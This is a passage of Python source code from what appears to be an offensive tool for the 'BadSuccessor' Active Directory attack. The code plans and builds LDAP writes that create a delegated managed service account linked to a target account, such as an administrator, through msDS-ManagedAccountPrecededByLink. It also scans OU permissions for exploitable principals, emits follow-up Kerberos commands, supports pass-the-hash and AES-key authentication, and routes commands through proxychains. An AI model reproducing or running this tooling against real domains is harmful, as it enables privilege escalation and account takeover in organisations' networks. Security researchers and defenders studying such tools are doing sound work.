        events.append({
            'kind': kind,
            'status': status,
            'detail': detail,
        })

    account_domain = domain_from_account_hint(options.account)
    target_ou_base_dn = base_dn_from_dn_context(options.target_ou) if options.target_ou and validate_dn_syntax(options.target_ou) else None

    if not getattr(options, 'dc_host_supplied', False) and not getattr(options, 'dc_ip_supplied', False):
        add('dc_host', 'inferred', 'from account/domain')

    if account_domain and validate_domain_name(account_domain):
        if not getattr(options, 'scope_domain_supplied', False):
            add('scope_domain', 'inferred', 'from account domain %s' % account_domain.lower())
        if not getattr(options, 'base_dn_supplied', False):
            add('base_dn', 'inferred', 'from account domain %s' % account_domain.lower())
    elif target_ou_base_dn:
        if not getattr(options, 'scope_domain_supplied', False):
            add('scope_domain', 'inferred', 'from target OU DN')
        if not getattr(options, 'base_dn_supplied', False):
            add('base_dn', 'inferred', 'from target OU DN')
    elif options.scope_base_dn and not getattr(options, 'base_dn_supplied', False):
        add('base_dn', 'inferred', 'from --scope-base-dn')

    if options.scope_base_dn and not getattr(options, 'scope_base_dn_supplied', False):
        add('scope_base_dn', 'inferred', 'from scope domain')

    if not getattr(options, 'method_supplied', False) and not getattr(options, 'port_supplied', False):
        add('method', 'inferred', 'default LDAP')
        add('port', 'inferred', 'default 389')
        add('connection', 'planned', 'try LDAP/389 first; if connection fails, try LDAPS/636')
    elif getattr(options, 'port_supplied', False) and not getattr(options, 'method_supplied', False):
        add('method', 'inferred', 'from --port %s' % options.port)
    elif not getattr(options, 'port_supplied', False):
        add('port', 'inferred', 'from --method %s' % options.method)

    dns_hostname = effective_dns_hostname(options)
    if dns_hostname and not getattr(options, 'dns_hostname_supplied', False):
        add('dns_hostname', 'inferred', 'from --dmsa-name and account/scope domain')

    if options.action == 'add' and not options.target_account:
        add('target_account', 'required', 'set the account linked by msDS-ManagedAccountPrecededByLink')

    if options.principals_allowed is None and options.action == 'add':
        add('principals_allowed', 'required', 'set the SID, DN, or name written into msDS-GroupMSAMembership')

    return events


def planned_ldap_operations(options):
    base_dn = current_base_dn(options) or '(derived at runtime)'
    dmsa_dn = planned_dmsa_dn(options)
    target_account = options.target_account
    principals_allowed = options.principals_allowed
    verify_attempts = getattr(options, 'verify_attempts', DEFAULT_VERIFY_ATTEMPTS)

    operations = []
    if options.action in ASSESS_ACTIONS:
        ou_search_base = options.target_ou or base_dn
        if not options.skip_dc_prereq:
            operations.append({
                'type': 'search',
                'base': base_dn,
                'scope': LDAP_SUBTREE,
                'filter': 'domain controllers',
                'attributes': ['operatingSystem', 'operatingSystemVersion'],
            })
        operations.append({
            'type': 'search',
            'base': ou_search_base,
            'scope': LDAP_SUBTREE,
            'filter': '(objectClass=organizationalUnit)',
            'attributes': ['distinguishedName'] + (['nTSecurityDescriptor'] if options.include_sd else []),
            'controls': ['sdflags=0x5'] if options.include_sd else [],
        })
        if options.include_sd and options.resolve_names:
            operations.append({
                'type': 'conditional_search',
                'base': base_dn,
                'scope': LDAP_SUBTREE,
                'filter': '(objectSid=<sid>)',
                'attributes': ['sAMAccountName', 'distinguishedName'],
                'condition': 'per relevant SID found in OU security descriptors',
            })
        return operations

    if options.action in ('add', 'delete', 'verify'):
        operations.append({
            'type': 'search',
            'base': dmsa_dn or '(planned dMSA DN unavailable)',
            'scope': LDAP_BASE,
            'filter': '(objectClass=*)',
            'attributes': ['cn'],
            'purpose': 'existence check',
        })

    if options.action == 'add':
        if principals_allowed:
            operations.append(planned_principals_allowed_step(principals_allowed, base_dn))
        else:
            operations.append({
                'type': 'input_required',
                'field': '--principals-allowed',
                'purpose': 'msDS-GroupMSAMembership reader SID',
            })
        if target_account and looks_like_dn(target_account):
            operations.append({
                'type': 'search',
                'base': target_account,
                'scope': LDAP_BASE,
                'filter': '(|(objectClass=user)(objectClass=computer))',
                'attributes': ['distinguishedName', 'objectClass'],
                'purpose': 'target account DN validation',
            })
        elif target_account:
            operations.append({
                'type': 'search',
                'base': base_dn,
                'scope': LDAP_SUBTREE,
                'filter': 'target account lookup',
                'attributes': ['distinguishedName', 'objectClass', 'sAMAccountName'],
            })
        else:
            operations.append({
                'type': 'input_required',
                'field': '--target-account',
                'purpose': 'msDS-ManagedAccountPrecededByLink target DN',
            })
        operations.append({
            'type': 'add',
            'dn': dmsa_dn or '(generated at runtime)',
            'attributes': [
                'objectClass',
                'cn',
                'sAMAccountName',
                'dNSHostName',
                'userAccountControl',
                'msDS-ManagedPasswordInterval',
                'msDS-DelegatedMSAState',
                'msDS-SupportedEncryptionTypes',
                'accountExpires',
                'msDS-GroupMSAMembership',
                'msDS-ManagedAccountPrecededByLink',
                'nTSecurityDescriptor',
            ],
            'retry': 'without nTSecurityDescriptor only if DC rejects that attribute',
        })
        operations.append({
            'type': 'search',
            'base': dmsa_dn or '(generated at runtime)',
            'scope': LDAP_BASE,
            'filter': '(objectClass=msDS-DelegatedManagedServiceAccount)',
            'attributes': ['dMSA verification attributes'],
            'attempts': verify_attempts,
        })
    elif options.action == 'delete':
        operations.append({'type': 'delete', 'dn': dmsa_dn or '(planned dMSA DN unavailable)'})
        operations.append({
            'type': 'search',
            'base': dmsa_dn or '(planned dMSA DN unavailable)',
            'scope': LDAP_BASE,
            'filter': '(objectClass=*)',
            'attributes': ['cn'],
            'purpose': 'post-delete absence verification',
        })
    elif options.action == 'verify':
        if options.principals_allowed:
            operations.append(planned_principals_allowed_step(options.principals_allowed, base_dn))

    return operations


def planned_principals_allowed_step(principals_allowed, base_dn):
    principal = str(principals_allowed).strip()
    if principal.upper().startswith('S-1-'):
        return {
            'type': 'local_parse',
            'input': principal,
            'valid_sid': validate_sid_syntax(principal),
            'purpose': 'principals-allowed SID',
        }
    if looks_like_dn(principal):
        return {
            'type': 'search',
            'base': principal,
            'scope': LDAP_BASE,
            'filter': '(objectSid=*)',
            'attributes': ['objectSid', 'objectClass', 'sAMAccountName', 'distinguishedName'],
            'purpose': 'principals-allowed DN validation',
        }
    return {
        'type': 'search',
        'base': base_dn,
        'scope': LDAP_SUBTREE,
        'filter': 'principal lookup',
        'attributes': ['objectSid', 'objectClass', 'sAMAccountName', 'distinguishedName'],
    }


def report_ready_value(value, options):
    return format_value_for_display(value, base_dn=display_base_dn(options), redact=options.redact)


def report_input_target_account(options):
    if options.target_account:
        return report_ready_value(options.target_account, options)
    if options.action == 'add':
        return '(required for add execution)'
    return '(not set)'


def report_input_principals_allowed(options):
    if options.principals_allowed:
        return report_ready_value(options.principals_allowed, options)
    if options.action == 'add':
        return '(required for add execution)'
    return '(not set)'


def build_operation_report(options, mode, success=None, result=None):
    base_dn = current_base_dn(options)
    dmsa_dn = planned_dmsa_dn(options)
    dns_hostname = effective_dns_hostname(options)
    report = {
        'schema_version': SCHEMA_VERSION,
        'operation_id': options.operation_id,
        'tool': TOOL_NAME,
        'version': TOOL_VERSION,
        'mode': mode,
        'success': success,
        'action': options.action,
        'connection': {
            'dc_host': options.dc_host or '(from account/domain)',
            'dc_ip': options.dc_ip or '(not set)',
            'method': options.method,
            'port': effective_port(options),
            'auth': 'kerberos' if options.k else 'ntlm',
            'base_dn': report_ready_value(base_dn, options) if base_dn else '(derived at runtime)',
        },
        'scope': {
            'domain': options.scope_domain or '(not set)',
            'base_dn': report_ready_value(options.scope_base_dn, options) if options.scope_base_dn else '(not set)',
        },
        'inputs': {
            'account': options.account if options.account else '(not set)',
            'target_ou': report_ready_value(options.target_ou, options) if options.target_ou else '(not set)',
            'dmsa_name': options.dmsa_name or '(generated at runtime)',
            'planned_dmsa_dn': report_ready_value(dmsa_dn, options) if dmsa_dn else '(not available)',
            'target_account': report_input_target_account(options),
            'principals_allowed': report_input_principals_allowed(options),
            'dns_hostname': dns_hostname or '(generated at runtime)',
            'hashes_provided': bool(options.hashes),
            'aes_key_provided': bool(options.aes_key),
        },
        'controls': {
            'dry_run': options.dry_run,
            'profile': options.profile or '(not set)',
            'kerberos': options.k,
            'output_only': options.output_only,
            'redact': options.redact,
            'quiet': options.quiet,
            'no_banner': options.no_banner,
            'minimal': options.minimal,
            'low_noise': options.low_noise,
            'next_step_prefix': options.next_step_prefix or '(none)',
            'include_sd': options.include_sd,
            'resolve_names': options.resolve_names,
            'skip_dc_prereq': options.skip_dc_prereq,
            'verify_attempts': options.verify_attempts,
            'verify_delay': options.verify_delay,
            'timeout': options.timeout,
        },
        'parsed_inputs': {
            'base_dn_valid': validate_dn_syntax(base_dn) if base_dn else None,
            'scope_base_dn_valid': validate_dn_syntax(options.scope_base_dn) if options.scope_base_dn else None,
            'target_ou_dn_valid': validate_dn_syntax(options.target_ou) if options.target_ou else None,
            'target_account_is_dn': looks_like_dn(options.target_account) if options.target_account else False,
            'target_account_dn_valid': validate_dn_syntax(options.target_account) if options.target_account and looks_like_dn(options.target_account) else None,
            'principals_allowed_is_sid': validate_sid_syntax(options.principals_allowed) if options.principals_allowed else False,
            'principals_allowed_is_dn': looks_like_dn(options.principals_allowed) if options.principals_allowed else False,
            'principals_allowed_dn_valid': validate_dn_syntax(options.principals_allowed) if options.principals_allowed and looks_like_dn(options.principals_allowed) else None,
        },
        'inference': planned_inference_events(options),
        'ldap_operations': planned_ldap_operations(options),
        'result': result or {},
    }
    return redact_report(report, options)


def truthy_env(value):
    if value is None:
        return False
    return str(value).strip().lower() not in ('', '0', 'false', 'no', 'off')


def normalize_command_prefix(value):
    value = (value or '').strip()
    if not value:
        return ''
    try:
        parts = shlex.split(value)
    except ValueError:
        return value
    return ' '.join(shlex.quote(part) for part in parts)


def infer_next_step_prefix(env=None):
    env = env or os.environ
    explicit = normalize_command_prefix(env.get(NEXT_STEP_PREFIX_ENV))
    if explicit:
        return explicit

    proxychains_conf = env.get('PROXYCHAINS_CONF_FILE')
    preload = ' '.join([
        env.get('LD_PRELOAD', ''),
        env.get('DYLD_INSERT_LIBRARIES', ''),
    ]).lower()
    if not proxychains_conf and 'proxychains' not in preload:
        return ''

    parts = ['proxychains']
    if proxychains_conf:
        parts.extend(['-f', proxychains_conf])
    if truthy_env(env.get('PROXYCHAINS_QUIET_MODE')):
        parts.append('-q')
    return ' '.join(shlex.quote(part) for part in parts)


def apply_next_step_prefix(command, options):
    prefix = normalize_command_prefix(getattr(options, 'next_step_prefix', None))
    if not prefix:
        return command
    return '%s %s' % (prefix, command)


def append_option(parts, flag, value=None):
    if value is None or value is False:
        return
    parts.append(flag)
    if value is not True:
        parts.append(str(value))


def append_connection_options(parts, options):
    append_option(parts, '--dc-host', options.dc_host)
    append_option(parts, '--dc-ip', options.dc_ip)
    if getattr(options, 'method_supplied', False) or options.method != 'LDAP':
        append_option(parts, '--method', options.method)
    if getattr(options, 'port_supplied', False) or (options.port is not None and options.method != 'LDAP'):
        append_option(parts, '--port', effective_port(options))
    if getattr(options, 'timeout_supplied', False) or getattr(options, 'timeout', DEFAULT_LDAP_TIMEOUT) != DEFAULT_LDAP_TIMEOUT:
        append_option(parts, '--timeout', options.timeout)
    if getattr(options, 'base_dn_supplied', False):
        append_option(parts, '--base-dn', options.base_dn)
    if getattr(options, 'scope_domain_supplied', False):
        append_option(parts, '--scope-domain', options.scope_domain)
    if getattr(options, 'scope_base_dn_supplied', False):
        append_option(parts, '--scope-base-dn', options.scope_base_dn)


def append_auth_options(parts, options):
    append_option(parts, '--hashes', options.hashes)
    append_option(parts, '--kerberos', True if options.k else None)
    append_option(parts, '--aes-key', options.aes_key)
    append_option(parts, '--no-pass', True if options.no_pass else None)


def append_workflow_options(
    parts,
    action,
    options,
    kerberos_guidance=None,
    include_security_descriptor=None,
    resolve_names=None,
    search_summary=None,
    yes=None,
    dmsa_name=None,
    target_account=None,
    principals_allowed=None,
):
    effective_dmsa_name = options.dmsa_name if dmsa_name is None else dmsa_name
    effective_target_account = options.target_account if target_account is None else target_account
    effective_principals_allowed = options.principals_allowed if principals_allowed is None else principals_allowed
    if action in ('add', 'verify', 'delete'):
        append_option(parts, '--ou', options.target_ou)
        append_option(parts, '--dmsa-name', effective_dmsa_name)
    if action == 'add':
        append_option(parts, '--target-account', effective_target_account)
        append_option(parts, '--principals-allowed', effective_principals_allowed)
        append_option(parts, '--dns-hostname', options.dns_hostname)
        if options.verify_attempts != DEFAULT_VERIFY_ATTEMPTS:
            append_option(parts, '--verify-attempts', options.verify_attempts)
        if options.verify_delay != DEFAULT_VERIFY_DELAY:
            append_option(parts, '--verify-delay', options.verify_delay)
        if options.kdc_wait:
            append_option(parts, '--kdc-wait', options.kdc_wait)
    elif action == 'verify':
        append_option(parts, '--principals-allowed', effective_principals_allowed)
    elif action == 'delete':
        append_option(parts, '--yes', True if yes is True or options.yes else None)
    elif action in ASSESS_ACTIONS:
        append_option(parts, '--ou', options.target_ou)
        include_sd = options.include_sd if include_security_descriptor is None else include_security_descriptor
        resolve = options.resolve_names if resolve_names is None else resolve_names
        summary = options.search_summary if search_summary is None else search_summary
        append_option(parts, '--summary', True if summary else None)
        append_option(parts, '--include-security-descriptor', True if (include_security_descriptor is True or (include_sd and resolve)) else None)
        append_option(parts, '--resolve-names', True if resolve else None)
        append_option(parts, '--skip-dc-prereq', True if options.skip_dc_prereq else None)

    guidance = options.kerberos_guidance if kerberos_guidance is None else kerberos_guidance
    if action in ('add', 'verify') and guidance:
        append_option(parts, '--kerberos-guidance', True)


def options_with_overrides(options, **overrides):
    copied = argparse.Namespace(**vars(options))
    for key, value in overrides.items():
        setattr(copied, key, value)
    return copied


def command_for_action(action, options, plan=False, **overrides):
    parts = [TOOL_NAME]
    if plan:
        parts.append('plan')
    parts.extend([action, options.account])
    append_connection_options(parts, options)
    append_auth_options(parts, options)
    append_workflow_options(parts, action, options, **overrides)
    return apply_next_step_prefix(' '.join(shlex.quote(part) for part in parts), options)


def command_for_search_add_plan(options, candidate):
    target_ou = candidate.get('target_ou') if candidate else None
    principal = candidate.get('identity') if candidate else None
    if not target_ou or not principal:
        return None

    dmsa_name = options.dmsa_name or DEFAULT_SUGGESTED_DMSA_NAME
    target_account = options.target_account or SUGGESTED_TARGET_ACCOUNT
    parts = [TOOL_NAME, 'plan', 'add', options.account]
    append_connection_options(parts, options)
    append_auth_options(parts, options)
    append_option(parts, '--ou', target_ou)
    append_option(parts, '--dmsa-name', dmsa_name)
    append_option(parts, '--principals-allowed', principal)
    append_option(parts, '--target-account', target_account)
    return apply_next_step_prefix(' '.join(shlex.quote(part) for part in parts), options)


COMMON_TARGET_ACCOUNT_NAMES = set([
    'administrator',
    'admin',
    'guest',
    'krbtgt',
])


def suggested_dmsa_name_from_target_account(options):
    if options.action != 'add' or options.dmsa_name:
        return None
    target_account = str(options.target_account or '').strip()
    if not target_account:
        return None
    if looks_like_dn(target_account) or '\\' in target_account or '@' in target_account or target_account.endswith('$'):
        return None
    normalized = normalized_dmsa_name(target_account)
    if not normalized or not validate_dmsa_name(normalized):
        return None
    if normalized.lower() in COMMON_TARGET_ACCOUNT_NAMES:
        return None
    return normalized


def command_for_dry_run_action(options):
    suggested_dmsa_name = suggested_dmsa_name_from_target_account(options)
    target_account = options.target_account or SUGGESTED_TARGET_ACCOUNT
    principals_allowed = options.principals_allowed or PRINCIPALS_ALLOWED_PLACEHOLDER
    if suggested_dmsa_name:
        command = command_for_action(
            options.action,
            options,
            yes=True,
            dmsa_name=suggested_dmsa_name,
            target_account=SUGGESTED_TARGET_ACCOUNT,
            principals_allowed=principals_allowed,
        )
        return command, ''
    if options.action == 'add':
        return command_for_action(
            options.action,
            options,
            yes=True,
            target_account=target_account,
            principals_allowed=principals_allowed,
        ), ''
    return command_for_action(options.action, options, yes=True), ''


def kerberos_guidance_commands_for_options(options):
    domain, username, password = parse_account_hint(options.account)
    if not domain:
        domain = options.scope_domain or domain_from_base_dn(options.base_dn)
    lines = kerberos_guidance_lines(
        domain=domain,
        username=username,
        password=password,
        dmsa_name=options.dmsa_name or DEFAULT_SUGGESTED_DMSA_NAME,
        dc_host=options.dc_host,
        dc_ip=getattr(options, 'resolved_dc_ip', None) or options.dc_ip,
    )
    return lines[2:]


def search_result_has_followup_value(result):
    result = result or {}
    try:
        ou_count = int(result.get('ou_count', 0))
    except (TypeError, ValueError):
        ou_count = 0
    if ou_count <= 0:
        return False

    if result.get('mode') == 'security_descriptor_analysis':
        try:
            return int(result.get('identity_count', 0)) > 0
        except (TypeError, ValueError):
            return False

    return True


def search_next_step_candidates(result):
    candidates = result.get('_next_step_candidates') or []
    return [
        candidate for candidate in candidates
        if candidate.get('identity') and candidate.get('target_ou')
    ]


def report_has_rejected_dc_ip(report):
    for event in (report or {}).get('inference') or []:
        if event.get('kind') == 'dc_ip' and event.get('status') == 'rejected':
            return True
    return False


def command_for_dc_ip_fix(options):
    fixed_options = options_with_overrides(options, dc_ip='REAL_DC_IPV4')
    return command_for_action(options.action, fixed_options)


def build_next_steps(options, mode, success, result=None, report=None):
    steps = []

    def add(label, command, hint=''):
        if command and command not in [item['command'] for item in steps]:
            step = {'label': label, 'command': command}
            if hint:
                step['hint'] = hint
            steps.append(step)

    if mode == 'dry_run' and success:
        command, hint = command_for_dry_run_action(options)
        add('Command', command, hint=hint)
        return steps

    if not success:
        return steps

    step_options = options
    if report_has_rejected_dc_ip(report) and not options.dc_ip and options.action in ACTION_CHOICES:
        step_options = options_with_overrides(options, dc_ip='REAL_DC_IPV4')
        if options.action in ASSESS_ACTIONS:
            add('Rerun with a real DC IPv4', command_for_dc_ip_fix(options))
            return steps

    if options.action == 'add':
        add('Verify the dMSA object', command_for_action('verify', step_options, kerberos_guidance=False, principals_allowed=''))
        add('Delete the dMSA object when finished', command_for_action('delete', step_options, yes=True))
        if not options.kerberos_guidance:
            for command in kerberos_guidance_commands_for_options(step_options):
                add('Kerberos command', command)
    elif options.action == 'verify':
        add('Delete the dMSA object when finished', command_for_action('delete', step_options, yes=True))
        if not options.kerberos_guidance:
            for command in kerberos_guidance_commands_for_options(step_options):
                add('Kerberos command', command)
    elif options.action in ASSESS_ACTIONS:
        if not search_result_has_followup_value(result):
            return steps
        candidates = search_next_step_candidates(result)
        if candidates:
            add(
                'Review add plan for discovered principal',
                command_for_search_add_plan(step_options, candidates[0]),
            )
        elif not (options.include_sd and options.resolve_names):
            add('Resolve matching SID names', command_for_action(options.action, step_options, include_security_descriptor=True, resolve_names=True, search_summary=False))
    elif options.action == 'delete':
        add('Confirm cleanup with assess', command_for_action('assess', step_options))
    return steps


def attach_next_steps(report, options, mode, success):
    if report is None:
        return report
    result = dict(report.get('result') or {})
    result['next_steps'] = build_next_steps(options, mode=mode, success=success, result=result, report=report)
    result.pop('_next_step_candidates', None)
    report['result'] = result
    return report


def print_next_steps(options, report):
    if options.quiet or options.json or options.output_only:
        return
    steps = (report.get('result') or {}).get('next_steps') or []
    if not steps:
        return
    log_section('Next steps')
    for step in steps:
        if step.get('hint'):
            logging.info('  %s' % step.get('hint'))
        logging.info('  %s' % step.get('command'))


def inferred_plan_kinds(report):
    return {
        event.get('kind') for event in report.get('inference') or []
        if event.get('status') in ('inferred', 'runtime_default')
    }


def mark_inferred(value, kind, inferred_kinds):
    text = str(value)
    if kind in inferred_kinds:
        return '%s (inferred)' % text
    return text


def log_plan_field(label, value, kind, inferred_kinds):
    logging.info('%-24s %s' % (label, mark_inferred(value, kind, inferred_kinds)))


def dry_run_dc_host(options, report):
    configured = report.get('connection', {}).get('dc_host')
    if configured and configured != '(from account/domain)':
        return configured
    return domain_from_account_hint(options.account) or configured or '(from account/domain)'


def planned_bad_successor_values(options, report):
    if options.action != 'add':
        return []

    dmsa_name = options.dmsa_name or '(generated at runtime; pass --dmsa-name for a fixed name)'
    dmsa_sam = '%s$' % options.dmsa_name if options.dmsa_name else '(generated at runtime)'
    dmsa_dn = planned_dmsa_dn(options) or '(generated at runtime; needs --dmsa-name and --ou)'
    dns_hostname = effective_dns_hostname(options) or '(generated at runtime; needs --dmsa-name and domain)'
    principals_allowed = options.principals_allowed
    if not principals_allowed:
        membership = '(required for execution)'
    elif validate_sid_syntax(principals_allowed):
        membership = 'allow %s' % principals_allowed
    else:
        membership = 'allow SID resolved from %s' % principals_allowed
    target_account = options.target_account or '(required for execution)'
    if looks_like_dn(target_account):
        preceded_by = target_account
    elif target_account == '(required for execution)':
        preceded_by = target_account
    else:
        preceded_by = 'DN resolved from %s' % target_account

    return [
        ('dMSA DN', dmsa_dn, None),
        ('objectClass', 'msDS-DelegatedManagedServiceAccount', None),
        ('cn', dmsa_name, None),
        ('sAMAccountName', dmsa_sam, None),
        ('dNSHostName', dns_hostname, 'dns_hostname'),
        ('userAccountControl', '4096', None),
        ('msDS-ManagedPasswordInterval', '30', None),
        ('msDS-DelegatedMSAState', format_dmsa_delegated_state(DMSA_EXPECTED_DELEGATED_STATE), None),
        ('msDS-SupportedEncryptionTypes', '28', None),
        ('accountExpires', '9223372036854775807', None),
        ('msDS-GroupMSAMembership', membership, 'principals_allowed'),
        ('msDS-ManagedAccountPrecededByLink', preceded_by, None),
        ('nTSecurityDescriptor', 'creator keeps control; omitted automatically if rejected', None),
    ]


def print_action_plan_summary(options, report):
    inferred_kinds = inferred_plan_kinds(report)
    if options.action == 'add':
        log_section('Planned values')
        logging.info('BadSuccessor values:')
        for name, value, kind in planned_bad_successor_values(options, report):
            logging.info('  %-35s %s' % (name + ':', mark_inferred(value, kind, inferred_kinds)))
    elif options.action in ASSESS_ACTIONS:
        return
    elif options.action in ('verify', 'delete'):
        log_section('Planned values')
        logging.info('dMSA object:')
        logging.info('  %-35s %s' % ('dMSA DN:', planned_dmsa_dn(options) or '(needs --dmsa-name and --ou)'))


def print_dry_run_plan(options, report=None):
    report = report or build_operation_report(options, mode='dry_run', success=True)
    if options.output_only:
        return report

    inferred_kinds = inferred_plan_kinds(report)
    logging.info('Dry run: no LDAP connection will be opened and no changes will be made.')
    log_section('Run context')
    log_kv('Operation ID:', report['operation_id'])
    log_kv('Action:', report['action'])
    log_plan_field('Account:', report['inputs']['account'], None, inferred_kinds)
    log_plan_field('Method:', report['connection']['method'], 'method', inferred_kinds)
    log_plan_field('Port:', report['connection']['port'], 'port', inferred_kinds)
    log_plan_field('DC Host:', dry_run_dc_host(options, report), 'dc_host', inferred_kinds)
    log_plan_field('DC IP:', report['connection']['dc_ip'], None, inferred_kinds)
    log_plan_field('Base DN:', report['connection']['base_dn'], 'base_dn', inferred_kinds)
    log_plan_field('Scope Domain:', report['scope']['domain'], 'scope_domain', inferred_kinds)
    log_plan_field('Scope Base DN:', report['scope']['base_dn'], 'scope_base_dn', inferred_kinds)
    if options.action in ASSESS_ACTIONS:
        log_plan_field('OU Base:', options.target_ou or report['connection']['base_dn'], None if options.target_ou else 'base_dn', inferred_kinds)
        logging.info('%-24s %s' % ('Security descriptors:', 'yes' if options.include_sd else 'no'))
        logging.info('%-24s %s' % ('Resolve names:', 'yes' if options.resolve_names else 'no'))
    elif options.action == 'add':
        log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
        log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
        logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
        log_plan_field('Target Account:', report['inputs']['target_account'], 'target_account', inferred_kinds)
        log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
        log_plan_field('DNS Hostname:', report['inputs']['dns_hostname'], 'dns_hostname', inferred_kinds)
    elif options.action in ('verify', 'delete'):
        log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
        log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
        logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
        if options.action == 'verify':
            log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
    logging.info('%-24s %s' % ('Kerberos:', 'yes' if options.k else 'no'))
    logging.info('%-24s %s' % ('Hashes:', options.hashes or '(not set)'))
    logging.info('%-24s %s' % ('AES Key:', options.aes_key or '(not set)'))
    if report.get('inference') and options.debug:
        logging.info('Auto decisions:')
        for event in report['inference']:
            logging.info('  - %s: %s - %s' % (event.get('kind'), event.get('status'), event.get('detail')))
    print_action_plan_summary(options, report)
    return report


def add_common_local_options(parser, include_workflow=True, concise=False, workflow_group=None):
    local = parser
    workflow_target = workflow_group or parser
    hidden = argparse.SUPPRESS
    local.add_argument('--profile', choices=PROFILE_CHOICES, help=hidden if concise else 'Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
    if include_workflow:
        workflow_target.add_argument('--dry-run', '--plan', dest='dry_run', action='store_true', help='Validate options and print planned LDAP operations without opening LDAP.')
    local.add_argument('--json', action='store_true', help=hidden if concise else 'Emit a structured JSON operation report to stdout.')
    local.add_argument('--output', action='store', metavar='FILE', help=hidden if concise else 'Write the operation report to FILE with mode 0600. With --output-only, FILE is JSON.')
    local.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help=hidden if concise else 'Emit only JSON to stdout, or JSON to --output with no stdout.')
    local.add_argument('--quiet', action='store_true', help=hidden if concise else 'Lower terminal output to warning/error only.')
    local.add_argument('--no-banner', action='store_true', help=hidden if concise else 'Suppress startup banner and attribution text.')
    if include_workflow:
        local.add_argument('--minimal', action='store_true', help=hidden if concise else 'Lightest workflow: no broad assessment analysis, name resolution, or extra Kerberos command output.')
        local.add_argument('--lean', dest='low_noise', action='store_true', help=hidden if concise else 'Enable lean local defaults.')
    redaction = local.add_mutually_exclusive_group()
    redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help=hidden if concise else 'Redact sensitive local output. This is the default.')
    redaction.add_argument('--no-redact', dest='redact', action='store_false', help=hidden if concise else 'Disable local output redaction. Requires --debug.')


def add_connection_options(parser, include_auth=True, show_auth=True, concise=False):
    ldap_group = parser.add_argument_group('LDAP')
    hidden = argparse.SUPPRESS
    ldap_group.add_argument('--base-dn', dest='base_dn', action='store', metavar='BASE_DN', help=hidden if concise else 'Set LDAP base DN. Defaults from account domain.')
    ldap_group.add_argument('--scope-base-dn', action='store', metavar='BASE_DN', help=hidden if concise else 'Guardrail: refuse target DNs outside this base DN. Defaults from account/scope domain.')
    ldap_group.add_argument('--scope-domain', action='store', metavar='FQDN', help=hidden if concise else 'Guardrail: refuse obvious domain/base DN mismatches. Defaults from account domain.')
    ldap_group.add_argument('--method', '-m', type=connection_method, default='LDAP', help='Connection method: LDAP or LDAPS. Defaults to LDAP/389.')
    ldap_group.add_argument('--port', '-p', type=int, choices=[389, 636], help='Destination port. LDAP defaults to 389, LDAPS to 636.')
    ldap_group.add_argument('--dc-host', dest='dc_host', action='store', metavar='HOSTNAME', help='Hostname of the domain controller.')
    ldap_group.add_argument('--dc-ip', dest='dc_ip', action='store', metavar='IP', help='IP of the domain controller.')
    ldap_group.add_argument('--timeout', dest='timeout', action='store', type=positive_float, default=DEFAULT_LDAP_TIMEOUT, metavar='SECONDS', help=hidden if concise else 'LDAP socket timeout. Default: %(default)s seconds.')

    if include_auth:
        help_text = None if show_auth else argparse.SUPPRESS
        auth_group = parser if concise else parser.add_argument_group('authentication')
        auth_group.add_argument('--hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes.' if show_auth else help_text)
        auth_group.add_argument('--no-pass', dest='no_pass', action='store_true', help="Don't ask for password." if show_auth else help_text)
        auth_group.add_argument('--kerberos', '-k', dest='k', action='store_true', help='Use Kerberos authentication.' if show_auth else help_text)
        auth_group.add_argument('--aes-key', dest='aes_key', action='store', metavar='HEX', help='AES key for Kerberos authentication.' if show_auth else help_text)


def add_common_advanced_options(parser, include_workflow=True, visible=True):
    advanced = parser.add_argument_group('advanced')
    hidden = argparse.SUPPRESS
    if include_workflow:
        advanced.add_argument('--allow-admin-fallback', action='store_true', help='Compatibility flag; exact target-account DN candidates are tried automatically and logged.' if visible else hidden)
        advanced.add_argument('--kerberos-guidance', action='store_true', help='After a verified add/verify, print external Kerberos commands.' if visible else hidden)
        advanced.add_argument('--kdc-wait', dest='kdc_wait', action='store', type=non_negative_int, default=0, metavar='SECONDS', help='Wait after LDAP verification. Default: 0.' if visible else hidden)
        advanced.add_argument('--verify-attempts', action='store', type=non_negative_int, default=DEFAULT_VERIFY_ATTEMPTS, metavar='N', help='Post-add LDAP verification attempts.' if visible else hidden)
        advanced.add_argument('--verify-delay', action='store', type=non_negative_float, default=DEFAULT_VERIFY_DELAY, metavar='SECONDS', help='Delay between post-add verification attempts.' if visible else hidden)
    advanced.add_argument('--ts', action='store_true', help='Add timestamps to logging output.' if visible else hidden)
    advanced.add_argument('--debug', action='store_true', help='Turn DEBUG output ON.' if visible else hidden)
    advanced.add_argument('--next-step-prefix', '--command-prefix', dest='next_step_prefix', action='store', metavar='COMMAND', help='Prefix generated next-step commands only.' if visible else hidden)


def add_dmsa_workflow_options(parser, action, concise=False, title='workflow'):
    workflow = parser.add_argument_group(title)
    if action in ('add', 'verify', 'delete'):
        workflow.add_argument('--dmsa-name', '-d', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name.')
        workflow.add_argument('--ou', '--target-ou', '-o', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN.')
    if action == 'add':
        workflow.add_argument('--target-account', '-t', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN.')
    if action == 'add':
        workflow.add_argument('--principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='Managed-password reader SID, DN, or name.')
    elif action == 'verify':
        workflow.add_argument('--principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='Expected managed-password reader SID, DN, or name for validation.')
    if action == 'add':
        workflow.add_argument('--dns-hostname', dest='dns_hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA.')
    if action in DESTRUCTIVE_ACTIONS:
